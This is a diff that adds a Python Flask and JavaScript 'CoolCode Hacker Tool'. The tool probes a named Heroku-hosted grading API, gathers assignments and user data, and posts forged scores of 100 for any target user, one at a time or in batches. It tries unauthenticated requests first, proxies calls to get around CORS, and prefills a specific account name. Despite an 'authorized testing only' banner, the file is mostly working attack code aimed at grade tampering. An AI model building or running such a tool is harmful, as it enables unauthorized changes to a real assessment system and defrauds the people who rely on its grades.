@@ -1,0 +1,470 @@
+import requests
+import json
+from flask import Blueprint, request, jsonify, render_template_string
+
+coolcode_hacker = Blueprint('coolcode_hacker', __name__)
+
+# Base URL for the CoolCode API
+BASE_URL = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
+API_BASE = f"{BASE_URL}/api"
+
+class CoolCodeHacker:
+    def __init__(self, username=None, password=None):
+        self.session = requests.Session()
+        self.username = username
+        self.password = password
+        self.auth_token = None
+        
+    def login(self, username=None, password=None):
+        """Login to CoolCode system"""
+        if username:
+            self.username = username
+        if password:
+            self.password = password
+            
+        login_data = {
+            "username": self.username,
+            "password": self.password
+        }
+        
+        try:
+            # Try different login endpoints
+            login_endpoints = [
+                f"{API_BASE}/auth/login",
+                f"{API_BASE}/login",
+                f"{BASE_URL}/login",
+                f"{API_BASE}/api/auth/login"
+            ]
+            
+            for endpoint in login_endpoints:
+                try:
+                    response = self.session.post(endpoint, json=login_data)
+                    print(f"Trying login endpoint: {endpoint}")
+                    print(f"Status: {response.status_code}")
+                    print(f"Response: {response.text[:200]}...")
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        if 'token' in data:
+                            self.auth_token = data['token']
+                            self.session.headers.update({'Authorization': f'Bearer {self.auth_token}'})
+                        return True
+                        
+                except Exception as e:
+                    print(f"Login attempt failed for {endpoint}: {e}")
+                    continue
+                    
+            return False
+            
+        except Exception as e:
+            print(f"Login error: {e}")
+            return False
+    
+    def get_assignments(self):
+        """Get list of assignments"""
+        endpoints = [
+            f"{API_BASE}/assignments",
+            f"{API_BASE}/api/assignments",
+            f"{API_BASE}/assignment",
+            f"{API_BASE}/api/assignment"
+        ]
+        
+        for endpoint in endpoints:
+            try:
+                response = self.session.get(endpoint)
+                print(f"Trying assignments endpoint: {endpoint}")
+                print(f"Status: {response.status_code}")
+                print(f"Response: {response.text[:200]}...")
+                
+                if response.status_code == 200:
+                    return response.json()
+                    
+            except Exception as e:
+                print(f"Failed to get assignments from {endpoint}: {e}")
+                continue
+                
+        return None
+    
+    def get_user_info(self, username=None):
+        """Get user information"""
+        target_user = username or self.username
+        
+        endpoints = [
+            f"{API_BASE}/user/{target_user}",
+            f"{API_BASE}/api/user/{target_user}",
+            f"{API_BASE}/users/{target_user}",
+            f"{API_BASE}/api/users/{target_user}"
+        ]
+        
+        for endpoint in endpoints:
+            try:
+                response = self.session.get(endpoint)
+                print(f"Trying user info endpoint: {endpoint}")
+                print(f"Status: {response.status_code}")
+                
+                if response.status_code == 200:
+                    return response.json()
+                    
+            except Exception as e:
+                print(f"Failed to get user info from {endpoint}: {e}")
+                continue
+                
+        return None
+    
+    def submit_score(self, username, assignment_id, score):
+        """Submit/override score for a user"""
+        score_endpoint = f"{API_BASE}/api/assignment/score"
+        
+        payload = {
+            "username": username,
+            "assignmentId": assignment_id,
+            "score": score
+        }
+        
+        try:
+            # Try without authentication first
+            response = requests.post(score_endpoint, json=payload)
+            print(f"Score submission (no auth) - Status: {response.status_code}")
+            print(f"Response: {response.text}")
+            
+            if response.status_code == 200:
+                return response.json()
+            
+            # Try with session authentication
+            response = self.session.post(score_endpoint, json=payload)
+            print(f"Score submission (with auth) - Status: {response.status_code}")
+            print(f"Response: {response.text}")
+            
+            if response.status_code == 200:
+                return response.json()
+                
+            # Try different headers
+            headers = {
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': BASE_URL,
+                'Referer': f"{BASE_URL}/ui/"
+            }
+            
+            response = self.session.post(score_endpoint, json=payload, headers=headers)
+            print(f"Score submission (with headers) - Status: {response.status_code}")
+            print(f"Response: {response.text}")
+            
+            return response.json() if response.status_code == 200 else None
+            
+        except Exception as e:
+            print(f"Score submission error: {e}")
+            return None
+    
+    def explore_endpoints(self):
+        """Explore various API endpoints to understand the system"""
+        common_endpoints = [
+            "/api/health",
+            "/api/status", 
+            "/api/users",
+            "/api/assignments",
+            "/api/scores",
+            "/api/leaderboard",
+            "/api/user/profile",
+            "/health",
+            "/status"
+        ]
+        
+        results = {}
+        
+        for endpoint in common_endpoints:
+            full_url = BASE_URL + endpoint
+            try:
+                response = self.session.get(full_url)
+                results[endpoint] = {
+                    'status': response.status_code,
+                    'response': response.text[:100] + "..." if len(response.text) > 100 else response.text
+                }
+                print(f"{endpoint}: {response.status_code}")
+                
+            except Exception as e:
+                results[endpoint] = {'error': str(e)}
+                
+        return results
+
+# Flask routes for the hacker tool
+@coolcode_hacker.route('/coolcode_hacker')
+def hacker_interface():
+    html_template = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>CoolCode Hacker Tool</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #00ff00; }
+            .container { max-width: 800px; margin: 0 auto; }
+            .section { margin: 20px 0; padding: 20px; border: 1px solid #00ff00; border-radius: 5px; }
+            input, button, textarea { padding: 10px; margin: 5px; font-size: 14px; }
+            button { background: #00ff00; color: #000; border: none; cursor: pointer; }
+            button:hover { background: #00cc00; }
+            .output { background: #000; padding: 10px; border-radius: 5px; white-space: pre-wrap; }
+            .warning { color: #ff6600; font-weight: bold; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🔥 CoolCode Hacker Tool 🔥</h1>
+            <p class="warning">⚠️ For authorized penetration testing only!</p>
+            
+            <div class="section">
+                <h2>1. Login</h2>
+                <input type="text" id="username" placeholder="Username (CX8de3ce71-3cbTY)" value="CX8de3ce71-3cbTY">
+                <input type="password" id="password" placeholder="Password">
+                <button onclick="login()">Login</button>
+            </div>
+            
+            <div class="section">
+                <h2>2. Reconnaissance</h2>
+                <button onclick="exploreEndpoints()">Explore API Endpoints</button>
+                <button onclick="getAssignments()">Get Assignments</button>
+                <button onclick="getUserInfo()">Get User Info</button>
+            </div>
+            
+            <div class="section">
+                <h2>3. Score Override</h2>
+                <input type="text" id="targetUsername" placeholder="Target Username">
+                <input type="number" id="assignmentId" placeholder="Assignment ID">
+                <input type="number" id="score" placeholder="Score" value="100">
+                <button onclick="submitScore()">Submit Score</button>
+            </div>
+            
+            <div class="section">
+                <h2>4. Batch Score Override</h2>
+                <input type="text" id="batchUsername" placeholder="Username">
+                <button onclick="overrideAllScores()">Override All Assignment Scores to 100</button>
+            </div>
+            
+            <div class="section">
+                <h2>Output</h2>
+                <div id="output" class="output">Ready for hacking...</div>
+            </div>
+        </div>
+        
+        <script>
+            function log(message) {
+                document.getElementById('output').innerHTML += new Date().toISOString() + ': ' + message + '\\n';
+            }
+            
+            async function makeRequest(endpoint, method = 'GET', data = null) {
+                try {
+                    const options = {
+                        method: method,
+                        headers: {
+                            'Content-Type': 'application/json',
+                        }
+                    };
+                    
+                    if (data) {
+                        options.body = JSON.stringify(data);
+                    }
+                    
+                    const response = await fetch(endpoint, options);
+                    const result = await response.text();
+                    
+                    log(`${method} ${endpoint} - Status: ${response.status}`);
+                    log(`Response: ${result.substring(0, 200)}${result.length > 200 ? '...' : ''}`);
+                    
+                    return { status: response.status, data: result };
+                } catch (error) {
+                    log(`Error: ${error.message}`);
+                    return { error: error.message };
+                }
+            }
+            
+            async function login() {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                log(`Attempting login for: ${username}`);
+                
+                const loginData = { username, password };
+                const endpoints = [
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/auth/login',
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/login',
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/login'
+                ];
+                
+                for (const endpoint of endpoints) {
+                    await makeRequest(endpoint, 'POST', loginData);
+                }
+            }
+            
+            async function exploreEndpoints() {
+                log('Starting endpoint reconnaissance...');
+                
+                const endpoints = [
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/health',
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/users',
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/assignments',
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/scores'
+                ];
+                
+                for (const endpoint of endpoints) {
+                    await makeRequest(endpoint);
+                }
+            }
+            
+            async function getAssignments() {
+                log('Fetching assignments...');
+                
+                const endpoints = [
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/assignments',
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignments'
+                ];
+                
+                for (const endpoint of endpoints) {
+                    await makeRequest(endpoint);
+                }
+            }
+            
+            async function getUserInfo() {
+                const username = document.getElementById('username').value;
+                log(`Getting user info for: ${username}`);
+                
+                const endpoints = [
+                    `https://coolcode-hacker-34c5455cd908.herokuapp.com/api/user/${username}`,
+                    `https://coolcode-hacker-34c5455cd908.herokuapp.com/api/users/${username}`
+                ];
+                
+                for (const endpoint of endpoints) {
+                    await makeRequest(endpoint);
+                }
+            }
+            
+            async function submitScore() {
+                const username = document.getElementById('targetUsername').value;
+                const assignmentId = parseInt(document.getElementById('assignmentId').value);
+                const score = parseInt(document.getElementById('score').value);
+                
+                if (!username || !assignmentId || isNaN(score)) {
+                    log('Please fill in all fields for score submission');
+                    return;
+                }
+                
+                log(`Submitting score: ${username}, Assignment ${assignmentId}, Score ${score}`);
+                
+                const payload = {
+                    username: username,
+                    assignmentId: assignmentId,
+                    score: score
+                };
+                
+                await makeRequest(
+                    'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score',
+                    'POST',
+                    payload
+                );
+            }
+            
+            async function overrideAllScores() {
+                const username = document.getElementById('batchUsername').value;
+                if (!username) {
+                    log('Please enter username for batch override');
+                    return;
+                }
+                
+                log(`Starting batch score override for: ${username}`);
+                
+                // Try assignment IDs 1-20
+                for (let i = 1; i <= 20; i++) {
+                    const payload = {
+                        username: username,
+                        assignmentId: i,
+                        score: 100
+                    };
+                    
+                    log(`Attempting assignment ${i}...`);
+                    await makeRequest(
+                        'https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score',
+                        'POST',
+                        payload
+                    );
+                    
+                    // Small delay between requests
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+                
+                log('Batch override complete!');
+            }
+        </script>
+    </body>
+    </html>
+    '''
+    return html_template
+
+@coolcode_hacker.route('/coolcode_hacker/api/<path:endpoint>', methods=['GET', 'POST'])
+def proxy_api(endpoint):
+    """Proxy API calls to avoid CORS issues"""
+    target_url = f"https://coolcode-hacker-34c5455cd908.herokuapp.com/api/{endpoint}"
+    
+    try:
+        if request.method == 'GET':
+            response = requests.get(target_url)
+        elif request.method == 'POST':
+            response = requests.post(target_url, json=request.get_json())
+            
+        return jsonify({
+            'status': response.status_code,
+            'data': response.text,
+            'headers': dict(response.headers)
+        })
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# Command line interface
+def main():
+    """Main function for command line usage"""
+    print("🔥 CoolCode Hacker Tool 🔥")
+    print("For authorized penetration testing only!")
+    print()
+    
+    # Initialize hacker
+    hacker = CoolCodeHacker()
+    
+    # Get credentials
+    username = input("Enter username (CX8de3ce71-3cbTY): ") or "CX8de3ce71-3cbTY"
+    password = input("Enter password: ")
+    
+    print(f"\n1. Attempting login for {username}...")
+    if hacker.login(username, password):
+        print("✅ Login successful!")
+    else:
+        print("❌ Login failed, but continuing without auth...")
+    
+    print("\n2. Exploring API endpoints...")
+    endpoints = hacker.explore_endpoints()
+    for endpoint, result in endpoints.items():
+        if 'error' not in result:
+            print(f"  {endpoint}: {result['status']}")
+    
+    print("\n3. Getting assignments...")
+    assignments = hacker.get_assignments()
+    if assignments:
+        print(f"  Found assignments: {assignments}")
+    
+    print("\n4. Getting user info...")
+    user_info = hacker.get_user_info()
+    if user_info:
+        print(f"  User info: {user_info}")
+    
+    print("\n5. Score override demo...")
+    target_username = input("Enter target username for score override: ")
+    if target_username:
+        # Try to override scores for assignments 1-10
+        for assignment_id in range(1, 11):
+            result = hacker.submit_score(target_username, assignment_id, 100)
+            if result:
+                print(f"  ✅ Assignment {assignment_id}: Score updated!")
+            else:
+                print(f"  ❌ Assignment {assignment_id}: Failed")
+    
+    print("\nHacking session complete! 🎯")
+
+if __name__ == "__main__":
+    main()
